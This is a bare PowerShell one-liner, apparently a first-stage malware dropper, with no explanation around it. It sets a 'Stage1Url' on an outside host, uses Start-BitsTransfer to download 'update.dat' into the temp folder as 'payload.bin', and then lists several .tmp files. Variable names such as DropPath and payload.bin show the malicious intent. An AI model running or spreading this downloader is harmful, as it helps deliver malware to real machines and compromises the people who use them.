
$Stage1Url = 'http://192.0.2.119/assets/update.dat'; $DropPath = "$env:TEMP\payload.bin"; Start-BitsTransfer -Source $Stage1Url -Destination $DropPath; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
